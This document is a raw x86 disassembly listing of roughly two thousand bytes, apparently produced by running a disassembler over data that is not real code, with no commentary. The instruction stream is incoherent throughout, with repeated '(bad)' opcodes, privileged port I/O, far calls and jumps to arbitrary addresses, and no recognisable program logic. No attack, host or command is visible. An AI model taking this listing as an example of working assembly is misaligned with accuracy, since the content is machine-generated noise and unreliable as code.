  48966a:	mov    WORD PTR [ecx],ss
  48966c:	dec    ebx
  48966d:	jp     0x489631
  48966f:	vpmacswd ymm2,ymm0,ymm1,ymm4
  489675:	mov    al,ds:0xaf58511c
  48967a:	mov    al,ds:0x4c8ca09e
  48967f:	jmp    0xdac416c8
  489684:	sub    BYTE PTR [eax+0x2e1695bb],al
  48968a:	lods   eax,DWORD PTR ds:[esi]
  48968b:	jge    0x48970c
  48968d:	pop    ds
  48968e:	sbb    al,0x69
  489690:	or     cl,BYTE PTR [ebx+edx*1]
  489693:	add    al,BYTE PTR [ecx]
  489695:	push   es
  489696:	je     0x489701
  489698:	or     eax,0x33e3fca2
  48969d:	mov    esi,0xb5b4755
  4896a2:	pop    ebx
  4896a3:	mov    BYTE PTR [eax+0x16],bh
  4896a6:	(bad)  
  4896a7:	or     al,0x8b
  4896a9:	(bad)  
  4896aa:	jb     0x4896bb
  4896ac:	or     BYTE PTR [edi+0x5b],dl
  4896af:	push   edi
  4896b0:	sub    al,0xc7
  4896b2:	inc    ebx
  4896b3:	xor    al,dh
  4896b5:	cmp    al,0x30
  4896b7:	adc    DWORD PTR [ebx+0xb],0xffffffaf
  4896bb:	sbb    eax,DWORD PTR [ebx-0x1a]
  4896be:	mov    edi,0x1448c7ef
  4896c3:	dec    eax
  4896c4:	sbb    dl,BYTE PTR [ebx]
  4896c6:	dec    ecx
  4896c7:	sbb    ecx,esi
  4896c9:	test   ch,bl
  4896cb:	push   ss
  4896cc:	push   ecx
  4896cd:	mov    eax,cs
  4896cf:	push   ebp
  4896d0:	push   es
  4896d1:	adc    DWORD PTR [ecx-0x58],ecx
  4896d4:	xchg   BYTE PTR [edi+0x221ab114],dl
  4896da:	xchg   edi,eax
  4896db:	jns    0x489705
  4896dd:	adc    BYTE PTR [edi],cl
  4896df:	xchg   DWORD PTR [edi+0x1a],ebx
  4896e2:	call   0x71591d17
  4896e7:	es call 0x515eabb7
  4896ed:	jbe    0x48970b
  4896ef:	and    al,0x6a
  4896f1:	inc    ebp
  4896f2:	adc    dl,cl
  4896f4:	in     eax,0xe9
  4896f6:	scas   eax,DWORD PTR es:[edi]
  4896f7:	leave  
  4896f8:	inc    ecx
  4896f9:	pop    esi
  4896fa:	pusha  
  4896fb:	call   edi
  4896fd:	inc    ebx
  4896fe:	and    al,0x8b
  489700:	mov    dh,BYTE PTR [ebp+0x9]
  489703:	jns    0x4896dc
  489705:	inc    ebx
  489706:	cmp    al,0xcc
  489708:	and    BYTE PTR [ebx-0x3b],bl
  48970b:	pop    edx
  48970c:	mov    cl,0x31
  48970e:	jno    0x489766
  489710:	scas   al,BYTE PTR es:[edi]
  489711:	sbb    esi,DWORD PTR [ecx-0x18]
  489714:	or     al,0xd8
  489716:	fbstp  TBYTE PTR [edi]
  489718:	adc    al,0x6
  48971a:	imul   BYTE PTR [edx+0x48172441]
  489720:	out    dx,al
  489721:	dec    esi
  489722:	mov    al,0xd0
  489724:	adc    eax,0xeebe01a5
  489729:	(bad)  
  48972a:	out    dx,eax
  48972b:	inc    edx
  48972c:	iret   
  48972d:	add    cl,BYTE PTR [ebp-0x2]
  489730:	and    al,0x7e
  489732:	add    DWORD PTR [eax],ebx
  489734:	xchg   esi,eax
  489735:	mov    al,ds:0x55892060
  48973a:	xor    al,0x64
  48973c:	imul   ecx,DWORD PTR [edi],0x2ed77dcf
  489742:	ss mov bh,dh
  489745:	in     al,dx
  489746:	pop    ds
  489747:	int3   
  489748:	push   ss
  489749:	aam    0xd8
  48974b:	sub    dh,ch
  48974d:	add    BYTE PTR [edx-0x29],cl
  489750:	mov    al,ds:0x80e3aed9
  489755:	jne    0x4897b1
  489757:	xchg   esi,esi
  489759:	out    0xe,eax
  48975b:	xor    ch,cl
  48975d:	out    0xbb,al
  48975f:	sub    BYTE PTR [edi-0x20dba1ac],dh
  489765:	or     al,0xda
  489767:	sub    al,0x57
  489769:	popa   
  48976a:	lock popf 
  48976c:	in     al,dx
  48976d:	push   es
  48976e:	xor    ch,ah
  489770:	jg     0x489736
  489772:	inc    eax
  489773:	push   cs
  489774:	adc    edi,DWORD PTR [eax]
  489776:	dec    eax
  489777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489778:	adc    BYTE PTR [ebp+0x69],cl
  48977b:	xor    dl,bl
  48977d:	or     DWORD PTR [edi+0x57],0x37
  489781:	pop    es
  489782:	xor    DWORD PTR [edi+0x6a],edx
  489785:	das    
  489786:	gs or  ebp,0x7
  48978a:	sbb    DWORD PTR es:[si+0x601],0x4
  489791:	scas   al,BYTE PTR es:[edi]
  489792:	mov    ebp,0x3752ea81
  489797:	sbb    BYTE PTR [edi],0xcc
  48979a:	pop    ds
  48979b:	je     0x4897a2
  48979d:	dec    edx
  48979e:	mov    al,ds:0x30773b09
  4897a3:	cmp    al,BYTE PTR [eax+edi*4+0x1535e6bb]
  4897aa:	je     0x4897ba
  4897ac:	js     0x48975c
  4897ae:	pop    ebx
  4897af:	jp     0x4897f6
  4897b1:	cs mov eax,0xc0113f53
  4897b7:	pop    edx
  4897b8:	xchg   ecx,eax
  4897b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4897ba:	cmovs  ebp,DWORD PTR [ecx+0x16]
  4897be:	dec    edi
  4897bf:	mov    DWORD PTR [esi+0x34],0x6300c1b
  4897c6:	test   eax,ecx
  4897c8:	or     eax,0x536a9f65
  4897cd:	sbb    BYTE PTR [ecx-0x2fc8cc11],al
  4897d3:	outs   dx,DWORD PTR ds:[esi]
  4897d4:	and    al,0x38
  4897d6:	ja     0x489824
  4897d8:	out    0xe7,eax
  4897da:	mov    eax,DWORD PTR [edi+0xc]
  4897dd:	test   al,0xed
  4897df:	xchg   esi,eax
  4897e0:	push   eax
  4897e1:	das    
  4897e2:	int3   
  4897e3:	pusha  
  4897e4:	sbb    al,0x4c
  4897e6:	add    DWORD PTR [esi+0x6a],0xffffffc3
  4897ea:	push   ebp
  4897eb:	dec    esp
  4897ec:	sbb    BYTE PTR [esp+esi*2+0x27],dl
  4897f0:	push   ds
  4897f1:	add    DWORD PTR [ebp+edx*2+0x2edab977],0xc
  4897f9:	or     cl,BYTE PTR [ebp-0x75]
  4897fc:	inc    BYTE PTR [edi]
  4897fe:	sbb    BYTE PTR [edi+0x52],bh
  489801:	(bad)  
  489802:	jl     0x489811
  489804:	cmp    eax,0x75867605
  489809:	push   ebp
  48980a:	push   es
  48980b:	push   esi
  48980c:	xor    al,0x1
  48980e:	jge    0x489843
  489810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  489811:	jo     0x489867
  489813:	add    eax,0x2cb44064
  489818:	cmp    BYTE PTR [edx+0x16],dl
  48981b:	push   ss
  48981c:	jns    0x48988f
  48981e:	nop
  48981f:	inc    ecx
  489820:	add    DWORD PTR [edi],eax
  489822:	sub    BYTE PTR [eax+eiz*8+0x181478f5],0x4e
  48982a:	inc    esp
  48982b:	pusha  
  48982c:	inc    eax
  48982d:	imul   ecx,DWORD PTR [esi],0xc1480c75
  489833:	mov    dl,dh
  489835:	mov    edx,0x72027c5
  48983a:	fldenv [eax]
  48983c:	mov    esp,0xdac0d4ca
  489841:	inc    eax
  489842:	js     0x48985e
  489844:	sbb    al,dl
  489846:	cmp    ch,BYTE PTR es:[eax+0x40fe29e]
  48984d:	add    DWORD PTR [eax-0x431edff6],ebx
  489853:	lahf   
  489854:	call   0x8ddb7c40
  489859:	push   esp
  48985a:	mov    bh,BYTE PTR [ecx-0x25]
  48985d:	pop    eax
  48985e:	xchg   esi,eax
  48985f:	xor    DWORD PTR [ebx+0x48],ecx
  489862:	xor    DWORD PTR ds:0x1b0e7034,ecx
  489868:	das    
  489869:	mov    ecx,0x399b056
  48986e:	mov    WORD PTR [ecx+0x20],fs
  489871:	aam    0x36
  489873:	sub    DWORD PTR [edx+0x18],eax
  489876:	mov    al,0xf
  489878:	ja     0x48983e
  48987a:	mov    esp,0x42856120
  48987f:	sbb    BYTE PTR [eax-0x4c7da03d],bl
  489885:	lods   eax,DWORD PTR ds:[esi]
  489886:	out    dx,eax
  489887:	sub    esp,DWORD PTR [ebp+0x5a]
  48988a:	addr16 push esi
  48988c:	repnz xor BYTE PTR [eax+0x35],al
  489890:	sbb    bl,0x43
  489893:	cs pop ebx
  489895:	push   0xd3ff1f1
  48989a:	icebp  
  48989b:	jecxz  0x4898a7
  48989d:	cmp    DWORD PTR [eax-0x2f0718ac],0xcc3c4561
  4898a7:	xor    al,0x28
  4898a9:	out    dx,al
  4898aa:	test   eax,0xd821049f
  4898af:	push   ebx
  4898b0:	push   edx
  4898b1:	daa    
  4898b2:	cmp    al,0x24
  4898b4:	sahf   
  4898b5:	cmp    dh,BYTE PTR [eax-0x1d]
  4898b8:	xor    al,0xd5
  4898ba:	pop    eax
  4898bb:	test   DWORD PTR [eax+0x43],esi
  4898be:	xor    BYTE PTR [edi+0x59],dl
  4898c1:	out    0x4b,eax
  4898c3:	outs   dx,DWORD PTR ds:[esi]
  4898c4:	inc    ecx
  4898c5:	clc    
  4898c6:	adc    eax,0x89955a8a
  4898cb:	lahf   
  4898cc:	iret   
  4898cd:	retf   
  4898ce:	cwde   
  4898cf:	mov    DWORD PTR [ebx+0x3c],esi
  4898d2:	aas    
  4898d3:	cmp    ah,BYTE PTR [edi]
  4898d5:	scas   al,BYTE PTR es:[edi]
  4898d6:	call   0xcf03:0x76a4c837
  4898dd:	outs   dx,BYTE PTR ds:[esi]
  4898de:	inc    ebp
  4898df:	lahf   
  4898e0:	adc    esp,0x8aa82f9c
  4898e6:	dec    edx
  4898e7:	inc    ebp
  4898e8:	lea    esi,[esi+0x22dc1609]
  4898ee:	xchg   ecx,eax
  4898ef:	lods   al,BYTE PTR ds:[si]
  4898f1:	inc    esi
  4898f2:	inc    eax
  4898f3:	mov    eax,0xbd08770b
  4898f8:	cmp    BYTE PTR [ebx],0x61
  4898fb:	xchg   esi,eax
  4898fc:	xor    eax,0xe8130e08
  489901:	jne    0x489956
  489903:	loope  0x4898f4
  489905:	add    DWORD PTR [ebx],edx
  489907:	xor    BYTE PTR [eax+0x38701c0e],0xf0
  48990e:	and    ecx,DWORD PTR [ebx-0x5a5bbba0]
  489914:	or     al,0x33
  489916:	adc    al,0x2f
  489918:	or     al,BYTE PTR [edx]
  48991a:	dec    edi
  48991b:	das    
  48991c:	fnsave [ecx+0x5a]
  48991f:	fild   WORD PTR [eax+0x5638737e]
  489925:	push   esi
  489926:	rol    BYTE PTR [ecx+0x78],0xa2
  48992a:	cmc    
  48992b:	adc    al,0x32
  48992d:	xchg   esp,eax
  48992e:	(bad)  
  48992f:	das    
  489930:	mov    ebp,0x8cb0cb23
  489935:	sbb    al,0x57
  489937:	popf   
  489938:	sub    esp,esp
  48993a:	mov    ds:0x3d75e2ca,eax
  48993f:	inc    esp
  489940:	jb     0x48998c
  489942:	jecxz  0x4898ee
  489944:	dec    eax
  489945:	dec    esi
  489946:	cmp    eax,0x4c3c71d9
  48994b:	adc    al,0xf1
  48994d:	into   
  48994e:	sar    BYTE PTR [edi],0x36
  489951:	fld    QWORD PTR [ebx+0x4a]
  489954:	popa   
  489955:	and    BYTE PTR [ecx-0xf96f25d],dl
  48995b:	and    BYTE PTR [ebx+0x45],bh
  48995e:	hlt    
  48995f:	imul   ebp,ebx,0x89a364b1
  489965:	cmp    eax,esi
  489967:	adc    eax,0x5d8bddce
  48996c:	adc    dh,BYTE PTR [ecx+0x5]
  48996f:	jecxz  0x4899e2
  489971:	mov    dl,0x8
  489973:	xchg   ecx,eax
  489974:	add    BYTE PTR [esi],al
  489976:	jp     0x489968
  489978:	arpl   WORD PTR [ebx-0x5b],di
  48997b:	sbb    edx,DWORD PTR [ecx+0x3c]
  48997e:	mov    ebx,0xc09c91dc
  489983:	cmp    BYTE PTR [edi+0x40ddd553],dl
  489989:	push   cs
  48998a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48998b:	mov    BYTE PTR [edi-0xe],ah
  48998e:	fstp   QWORD PTR [ebx-0x30ef39de]
  489994:	inc    eax
  489995:	xor    DWORD PTR [eax-0x5c],edx
  489998:	inc    edi
  489999:	inc    ebp
  48999a:	(bad)  
  48999c:	fwait
  48999d:	aam    0xc8
  48999f:	(bad)  
  4899a0:	int3   
  4899a1:	push   es
  4899a2:	and    DWORD PTR [ebx-0x1c],eax
  4899a5:	stos   DWORD PTR es:[edi],eax
  4899a6:	pop    edi
  4899a7:	stos   DWORD PTR es:[edi],eax
  4899a8:	fiadd  WORD PTR [ebx+0x65]
  4899ab:	and    al,0xbf
  4899ad:	cmp    ah,BYTE PTR ds:0xb4137c6e
  4899b3:	inc    eax
  4899b4:	gs dec ebp
  4899b6:	or     ecx,ebx
  4899b8:	push   cs
  4899b9:	daa    
  4899ba:	enter  0x5863,0xc5
  4899be:	sbb    ch,bh
  4899c0:	div    DWORD PTR [edx-0x4f18b922]
  4899c6:	inc    edx
  4899c7:	and    bh,ah
  4899c9:	sub    BYTE PTR [ebx],ch
  4899cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4899cc:	and    edx,ebp
  4899ce:	pop    ss
  4899cf:	ret    
  4899d0:	popf   
  4899d1:	and    al,bl
  4899d3:	adc    BYTE PTR [ecx+ecx*8-0x3c],al
  4899d7:	popa   
  4899d8:	je     0x4899ee
  4899da:	sbb    DWORD PTR [esp+edx*8],esp
  4899dd:	repnz inc esp
  4899df:	mov    edi,0x6083901b
  4899e4:	out    0x14,eax
  4899e6:	hlt    
  4899e7:	jg     0x4899c6
  4899e9:	dec    eax
  4899ea:	cmp    eax,0x2e4830ac
  4899ef:	neg    eax
  4899f1:	nop
  4899f2:	dec    edx
  4899f3:	pop    ebx
  4899f4:	sub    bl,bl
  4899f6:	imul   ebx,DWORD PTR [edx],0x98a74958
  4899fc:	lods   al,BYTE PTR ds:[esi]
  4899fd:	jp     0x4899b1
  4899ff:	pand   mm3,QWORD PTR [ebx]
  489a02:	and    al,0xde
  489a04:	dec    eax
  489a05:	icebp  
  489a06:	and    eax,edi
  489a08:	sbb    DWORD PTR [edi+0xa],esp
  489a0b:	cmp    BYTE PTR [ecx+eiz*8+0x62c255b],dh
  489a12:	sbb    BYTE PTR [ebx+0x60810a47],0x5c
  489a19:	sti    
  489a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  489a1b:	push   esi
  489a1c:	loopne 0x489a86
  489a1e:	cli    
  489a1f:	shr    bl,1
  489a21:	cmp    DWORD PTR [ebx+0x54],0x32
  489a25:	cs push ebp
  489a27:	test   eax,0x4e7a9313
  489a2c:	push   esp
  489a2d:	pop    edi
  489a2e:	add    eax,0x5d05d5dc
  489a33:	retf   0x8704
  489a36:	mov    dh,BYTE PTR [eax]
  489a38:	and    DWORD PTR [eax-0x6964d6b5],eax
  489a3e:	inc    ebx
  489a3f:	push   ebx
  489a40:	add    bh,BYTE PTR [eax+0x50]
  489a43:	stos   DWORD PTR es:[edi],eax
  489a44:	dec    ecx
  489a45:	push   ss
  489a46:	add    DWORD PTR [esi+0x4bd980a0],esi
  489a4c:	xor    al,0x35
  489a4e:	xor    BYTE PTR [ecx],al
  489a50:	mov    dh,0x5b
  489a52:	push   ds
  489a53:	pop    ecx
  489a54:	aaa    
  489a55:	push   0xffffffc2
  489a57:	mov    dl,0xc
  489a59:	mov    ah,0xe5
  489a5b:	add    esi,DWORD PTR [edi]
  489a5d:	loop   0x489a7c
  489a5f:	sub    al,0x8
  489a61:	inc    ecx
  489a62:	add    BYTE PTR [ebx],0xab
  489a65:	jnp    0x489ad6
  489a67:	jnp    0x489aae
  489a69:	or     BYTE PTR [ebx+eax*1],dl
  489a6c:	mov    al,0x8b
  489a6e:	push   ebp
  489a6f:	es adc al,0xb5
  489a72:	jne    0x489abc
  489a74:	dec    eax
  489a75:	mov    WORD PTR [esi],es
  489a77:	cmp    al,dl
  489a79:	inc    esp
  489a7a:	add    cl,0x4a
  489a7d:	lods   eax,DWORD PTR ds:[esi]
  489a7e:	push   ss
  489a7f:	in     eax,0xd6
  489a81:	adc    cl,BYTE PTR [esp+ebx*8]
  489a84:	inc    esi
  489a85:	cmp    eax,0x332dd9b5
  489a8a:	test   DWORD PTR [eax],ebp
  489a8c:	sbb    esp,DWORD PTR [esi+eax*2]
  489a8f:	pop    es
  489a90:	loop   0x489a8b
  489a92:	loope  0x489a84
  489a94:	inc    esi
  489a95:	gs push 0x5940d281
  489a9b:	sub    cl,ch
  489a9d:	ds mov ah,0x79
  489aa0:	push   esi
  489aa1:	cwde   
  489aa2:	fwait
  489aa3:	adc    BYTE PTR [ecx-0x66e8c9fe],bl
  489aa9:	xchg   edi,eax
  489aaa:	sbb    dl,al
  489aac:	mov    ds:0x862fffb4,eax
  489ab1:	pusha  
  489ab2:	fidiv  WORD PTR [ebx]
  489ab4:	mov    cl,0x8a
  489ab6:	pop    eax
  489ab7:	inc    eax
  489ab8:	push   es
  489ab9:	inc    ebx
  489aba:	push   es
  489abb:	sbb    ecx,DWORD PTR [edi]
  489abd:	or     al,0xc0
  489abf:	loop   0x489a92
  489ac1:	sbb    BYTE PTR [edi],dl
  489ac3:	mov    WORD PTR [edi-0x59],es
  489ac6:	xchg   ebp,eax
  489ac7:	mov    bh,0x2e
  489ac9:	push   edi
  489aca:	out    0xf9,eax
  489acc:	mov    ch,0xa0
  489ace:	xchg   esi,eax
  489acf:	inc    BYTE PTR [ebp+0x10]
  489ad2:	jl     0x489ade
  489ad4:	add    al,0x3c
  489ad6:	dec    ebx
  489ad7:	push   0x628ca60c
  489adc:	push   0xffffff89
  489ade:	js     0x489a6a
  489ae0:	repz adc al,0x2b
  489ae3:	adc    BYTE PTR [edi+0x7d],ah
  489ae6:	(bad)  
  489ae7:	mov    ds:0x6b758a62,al
  489aec:	sbb    eax,0x3a4be587
  489af1:	push   ebp
  489af2:	sub    bl,BYTE PTR [esi+0x14]
  489af5:	dec    eax
  489af6:	push   ecx
  489af7:	in     eax,0xde
  489af9:	and    BYTE PTR [edi-0x68],al
  489afc:	inc    eax
  489afd:	test   BYTE PTR [ecx-0x690b1cff],0xe4
  489b04:	pop    ds
  489b05:	psubsw mm2,QWORD PTR [edx+0x25cc50e2]
  489b0c:	jnp    0x489b83
  489b0e:	popf   
  489b0f:	jl     0x489b2c
  489b11:	xor    al,0x40
  489b13:	repz (bad) 
  489b15:	loop   0x489ac2
  489b17:	jb     0x489b0c
  489b19:	clc    
  489b1a:	dec    edx
  489b1b:	ja     0x489ad4
  489b1d:	test   eax,esi
  489b1f:	jl     0x489b5a
  489b21:	sub    al,0x7
  489b23:	lock lahf 
  489b25:	adc    eax,0x63cc9046
  489b2a:	in     eax,dx
  489b2b:	jl     0x489b01
  489b2d:	cs out dx,al
  489b2f:	rol    BYTE PTR [esi-0x8339374],0x74
  489b36:	hlt    
  489b37:	adc    al,0xd0
  489b39:	mov    ah,0xec
  489b3b:	scas   eax,DWORD PTR es:[edi]
  489b3c:	in     al,dx
  489b3d:	mov    ch,0x34
  489b3f:	outs   dx,BYTE PTR ds:[esi]
  489b40:	pop    ds
  489b41:	fld    DWORD PTR [eax]
  489b43:	sbb    ebx,DWORD PTR [edx-0x37e67cad]
  489b49:	enter  0xb6e5,0x5c
  489b4d:	pop    ebp
  489b4e:	call   0x929eac3b
  489b53:	sbb    cl,cl
  489b55:	call   0x19e8ad39
  489b5a:	pop    ds
  489b5b:	and    cl,ch
  489b5d:	cmp    BYTE PTR [eax-0x41bf0e79],dh
  489b63:	sub    esp,esp
  489b65:	into   
  489b66:	loop   0x489b53
  489b68:	cmp    esp,esi
  489b6a:	sar    al,cl
  489b6c:	mov    al,ds:0xc9e3089c
  489b71:	and    al,0xda
  489b73:	inc    ebp
  489b74:	adc    DWORD PTR [ebx+0x19b17717],ecx
  489b7a:	adc    ch,ch
  489b7c:	mov    edx,edi
  489b7e:	ror    cl,cl
  489b80:	dec    DWORD PTR [esi]
  489b82:	cmp    edx,DWORD PTR [ecx]
  489b84:	jp     0x489b81
  489b86:	rol    DWORD PTR [edx],1
  489b88:	aas    
  489b89:	jne    0x489b95
  489b8b:	in     al,0xa7
  489b8d:	adc    edi,DWORD PTR cs:[edi-0x27c3c7da]
  489b94:	std    
  489b95:	jae    0x489bb4
  489b97:	xchg   esp,eax
  489b98:	add    BYTE PTR ds:0x41468ab4,al
  489b9e:	mov    BYTE PTR [ebx+0x41],al
  489ba1:	imul   ecx,DWORD PTR [ecx],0x430aa6f1
  489ba7:	inc    ebx
  489ba8:	mov    dl,BYTE PTR [esi+0x40]
  489bab:	cmc    
  489bac:	push   ds
  489bad:	inc    edx
  489bae:	adc    DWORD PTR [edx+0x61],edx
  489bb1:	lods   al,BYTE PTR ds:[esi]
  489bb2:	inc    edx
  489bb3:	ret    
  489bb4:	cmp    esp,DWORD PTR [ebx+0x46]
  489bb7:	je     0x489be3
  489bb9:	sbb    al,0x9
  489bbb:	daa    
  489bbc:	jmp    0x489bd3
  489bbe:	lea    eax,[ecx]
  489bc0:	(bad)  
  489bc2:	stos   BYTE PTR es:[edi],al
  489bc3:	pop    ss
  489bc4:	rcl    BYTE PTR [ebp-0x77],cl
  489bc7:	or     BYTE PTR [ecx],dl
  489bc9:	push   ss
  489bca:	ins    DWORD PTR es:[edi],dx
  489bcb:	pushf  
  489bcc:	cmp    dl,BYTE PTR ds:0x7948a97a
  489bd2:	ror    DWORD PTR [ebx+eax*2],cl
  489bd5:	sub    DWORD PTR [ebp+0x503738d2],0x3763243f
  489bdf:	sub    BYTE PTR [eax],bh
  489be1:	pop    ss
  489be2:	mov    DWORD PTR [ebp-0x53],edx
  489be5:	sbb    BYTE PTR [eax],dl
  489be7:	rol    DWORD PTR [edx-0x574f9059],0x9
  489bee:	sub    eax,0x98c13563
  489bf3:	pushf  
  489bf4:	cmp    bh,ah
  489bf6:	or     al,0xe5
  489bf8:	data16 mov dh,0x8d
  489bfb:	je     0x489b8f
  489bfd:	cmp    DWORD PTR [ebx],edi
  489bff:	(bad)  
  489c00:	jl     0x489c0e
  489c02:	pop    ss
  489c03:	sub    al,0x70
  489c05:	and    BYTE PTR [ebp-0x74],dl
  489c08:	xor    al,0x1d
  489c0a:	ror    DWORD PTR [eax+eax*1],0x9
  489c0e:	in     al,0x13
  489c10:	in     eax,0x1d
  489c12:	jp     0x489bcc
  489c14:	popa   
  489c15:	push   ds
  489c16:	push   es
  489c17:	je     0x489c27
  489c19:	mov    BYTE PTR [eax],dl
  489c1b:	(bad)  
  489c1c:	ja     0x489be0
  489c1e:	ins    DWORD PTR es:[edi],dx
  489c1f:	loop   0x489c82
  489c21:	jl     0x489bee
  489c23:	xlat   BYTE PTR ds:[ebx]
  489c24:	adc    DWORD PTR [edx-0x27e0efed],ebx
  489c2a:	push   0x3d
  489c2c:	sbb    BYTE PTR [edx],bh
  489c2e:	(bad)  
  489c2f:	je     0x489cb0
  489c31:	xor    BYTE PTR [esi-0x5b],cl
  489c34:	dec    edi
  489c35:	dec    ecx
  489c36:	push   cs
  489c37:	and    ch,BYTE PTR [edi+0x1a]
  489c3a:	inc    edi
  489c3b:	pop    ecx
  489c3c:	jmp    0x26c8a2c7
  489c41:	aas    
  489c42:	push   esp
  489c43:	rol    DWORD PTR [esp+eiz*4-0x74],1
  489c47:	call   FWORD PTR [esi-0x2dde9217]
  489c4d:	add    al,0x46
  489c4f:	(bad)  
  489c50:	cli    
  489c51:	push   ss
  489c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489c53:	cs mov eax,0x2e8fc75d
  489c59:	enter  0xc8c2,0x94
  489c5d:	mov    bh,0x26
  489c5f:	dec    esp
  489c60:	enter  0x36c2,0x70
  489c64:	iret   
  489c65:	add    al,0x25
  489c67:	push   0xcf7b26d3
  489c6c:	inc    esi
  489c6d:	dec    edi
  489c6e:	xor    al,BYTE PTR [edx+0x48]
  489c71:	dec    esp
  489c72:	pop    ecx
  489c73:	add    DWORD PTR ds:0x81c1b12d,edi
  489c79:	or     al,dl
  489c7b:	or     cl,BYTE PTR [ecx]
  489c7d:	xchg   DWORD PTR [ebx+0x451210d9],ecx
  489c83:	ja     0x489c0e
  489c85:	and    DWORD PTR [edx+0x56431781],esp
  489c8b:	inc    esi
  489c8c:	cwde   
  489c8d:	or     eax,0x5569d4c1
  489c92:	es mov cl,0x11
  489c95:	add    edi,edi
  489c97:	enter  0x7c09,0x69
  489c9b:	mov    ebx,DWORD PTR [eax+0x430ade17]
  489ca1:	or     dh,ch
  489ca3:	scas   al,BYTE PTR es:[edi]
  489ca4:	mov    DWORD PTR [ecx],0xf8891845
  489caa:	fdiv   DWORD PTR [ecx+ecx*1-0x7e]
  489cae:	cwde   
  489caf:	xlat   BYTE PTR ds:[ebx]
  489cb0:	(bad)  
  489cb1:	dec    ebx
  489cb2:	and    dh,BYTE PTR [esi-0x38cec6f5]
  489cb8:	adc    eax,0x174b086d
  489cbd:	cmp    eax,0xf2484601
  489cc2:	aam    0x2d
  489cc4:	or     bh,ah
  489cc6:	inc    ebx
  489cc7:	mov    ebp,0xb64e5649
  489ccc:	cmp    al,0x4d
  489cce:	hlt    
  489ccf:	jmp    0x489cb7
  489cd1:	mov    eax,ds:0xf4e5afd1
  489cd6:	mov    eax,edi
  489cd8:	dec    ecx
  489cd9:	clc    
  489cda:	popa   
  489cdb:	in     al,0x8
  489cdd:	stc    
  489cde:	stos   BYTE PTR es:[edi],al
  489cdf:	or     eax,0x43e6f2c1
  489ce4:	test   BYTE PTR [ebp+0xa],al
  489ce7:	stc    
  489ce8:	movntq QWORD PTR [ebx+0x16],mm0
  489cec:	inc    eax
  489ced:	push   ds
  489cee:	test   al,0x80
  489cf0:	lahf   
  489cf1:	cmp    al,0xd8
  489cf3:	inc    ebx
  489cf4:	inc    ebx
  489cf5:	xchg   edx,eax
  489cf6:	xchg   ecx,eax
  489cf7:	pop    ds
  489cf8:	call   0x291ea016
  489cfd:	adc    eax,0x69c32303
  489d02:	bound  edx,QWORD PTR [esi-0x6aa83d69]
  489d08:	mov    BYTE PTR [edi-0x30fb6fff],ch
  489d0e:	and    BYTE PTR [edi+0x40],dl
  489d11:	mov    ebp,0x53033c38
  489d16:	sbb    cl,al
  489d18:	iret   
  489d19:	xlat   BYTE PTR ds:[ebx]
  489d1a:	sbb    al,cl
  489d1c:	out    0x43,eax
  489d1e:	jnp    0x489d56
  489d20:	test   BYTE PTR [eax],dl
  489d22:	nop    DWORD PTR [esi]
  489d25:	out    dx,al
  489d26:	scas   al,BYTE PTR es:[edi]
  489d27:	add    BYTE PTR [esi],bh
  489d29:	scas   eax,DWORD PTR es:[edi]
  489d2a:	ror    BYTE PTR [ebx-0x73],0x75
  489d2e:	fcomp  QWORD PTR [edx-0x5a549400]
  489d34:	mov    edi,0x7d785005
  489d39:	sbb    eax,0xd055389
  489d3e:	mov    ds:0xdae2ea54,eax
  489d43:	and    BYTE PTR [esi-0x59],dl
  489d46:	mov    al,0xf0
  489d48:	dec    eax
  489d49:	inc    esi
  489d4a:	sbb    BYTE PTR [ebp+ebp*1-0x4d],al
  489d4e:	pop    ss
  489d4f:	inc    ebp
  489d50:	pop    esp
  489d51:	and    BYTE PTR [ebx],al
  489d53:	je     0x489d8a
  489d55:	ins    BYTE PTR es:[edi],dx
  489d56:	mov    esp,0xb103a9b4
  489d5b:	aaa    
  489d5c:	jge    0x489dc8
  489d5e:	lock mov BYTE PTR [eax+0x3971b088],dl
  489d65:	es mov BYTE PTR ss:[eax],dh
  489d69:	jno    0x489dc0
  489d6b:	in     al,dx
  489d6c:	inc    eax
  489d6d:	mov    esi,0xec3811c9
  489d72:	imul   ebp,esp,0xe584c321
  489d78:	in     al,dx
  489d79:	xchg   ecx,eax
  489d7a:	shl    BYTE PTR [eax+0x1a5c1481],1
  489d80:	xor    edx,DWORD PTR [edx+0x5b]
  489d83:	cmp    esp,esp
  489d85:	in     eax,0xe9
  489d87:	dec    edx
  489d88:	xor    al,al
  489d8a:	inc    eax
  489d8b:	call   0xe8d7ee62
  489d90:	loopne 0x489d2d
  489d92:	test   eax,0xe45a9e22
  489d97:	ret    0x53d8
  489d9a:	imul   eax,DWORD PTR [esi+0x38],0xfd342c97
  489da1:	push   esi
  489da2:	mov    dl,0x5
  489da4:	retf   
  489da5:	ja     0x489d69
  489da7:	add    al,0x51
  489da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489daa:	add    eax,0xc9827a1f
  489daf:	rol    BYTE PTR [ebx+0xf],0xaf
  489db3:	xlat   BYTE PTR ds:[ebx]
  489db4:	scas   eax,DWORD PTR es:[edi]
  489db5:	add    ebp,edi
  489db7:	shr    BYTE PTR [edx+0x10],cl
  489dba:	ret    
  489dbb:	test   DWORD PTR [ecx-0x19],eax
  489dbe:	xchg   edi,eax
  489dbf:	test   DWORD PTR [edi+ebx*1+0x10],0xd0558df4
  489dc7:	pop    ecx
  489dc8:	fs nop
  489dca:	mov    eax,ebx
  489dcc:	(bad)  
  489dcd:	sub    al,0x8b
  489dcf:	lock in al,dx
  489dd1:	add    eax,0x4d2f09a5
  489dd6:	in     al,dx
  489dd7:	arpl   WORD PTR [ebx+edx*8],dx
  489dda:	inc    esi
  489ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489ddc:	fiadd  WORD PTR [ebx+0x2a]
  489ddf:	push   ecx
  489de0:	xor    eax,0x4a7dad4a
  489de5:	inc    edi
  489de6:	push   ss
  489de7:	loopne 0x489dfb
  489de9:	push   ds
  489dea:	aas    
  489deb:	adc    ebp,esi
  489ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  489dee:	jmp    0x91868814
  489df3:	push   cs
